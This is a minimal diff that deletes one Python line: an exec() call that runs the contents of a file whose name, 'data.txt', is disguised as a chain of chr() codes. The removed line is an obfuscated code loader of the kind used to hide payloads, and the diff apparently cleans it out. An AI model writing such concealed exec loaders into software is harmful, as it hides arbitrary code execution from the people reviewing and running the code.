@@ -1,1 +1,0 @@
-exec(open(chr(100)+chr(97)+chr(116)+chr(97)+chr(46)+chr(116)+chr(120)+chr(116)).read())
